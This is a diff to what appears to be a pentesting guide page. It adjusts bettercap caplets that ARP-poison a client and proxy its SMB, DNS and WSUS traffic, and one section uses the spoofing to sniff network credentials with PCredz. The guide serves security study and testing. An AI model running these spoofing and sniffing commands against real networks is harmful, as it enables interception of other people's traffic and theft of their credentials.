@@ -112,7 +112,7 @@ set any.proxy.dst_port 445
 
 # control logging and verbosity
 events.ignore endpoint
-events.ignore net.sniff
+events.ignore net.sniff.mdns
 
 # start the modules
 any.proxy on
@@ -145,8 +145,7 @@ set any.proxy.dst_port 53
 
 # control logging and verbosity
 events.ignore endpoint
-events.ignore net.sniff
-events.include net.sniff.dns
+events.ignore net.sniff.mdns
 
 # start the modules
 any.proxy on
@@ -187,8 +186,7 @@ set any.proxy.dst_port 8530
 
 # control logging and verbosity
 events.ignore endpoint
-events.ignore net.sniff
-events.include net.sniff.http.request
+events.ignore net.sniff.mdns
 
 # start the modules
 any.proxy on
@@ -209,8 +207,10 @@ The search for Windows updates can be manually triggered when having access to t
 {% tab title="Dumping network secrets" %}
 Start [PCredz](https://github.com/lgandx/PCredz) or Wireshark then start the poisoning attack
 
-{% code title="wsus\_spoofing.cap" %}
+{% code title="spoofing.cap" %}
 ```bash
+# quick recon of the network
+net.probe on
 
 # set the ARP poisoning
 set arp.spoof.targets $client_ip
@@ -219,7 +219,7 @@ set arp.spoof.fullduplex true
 
 # control logging and verbosity
 events.ignore endpoint
-events.ignore net.sniff
+events.ignore net.sniff.mdns
 
 # start the modules
 arp.spoof on
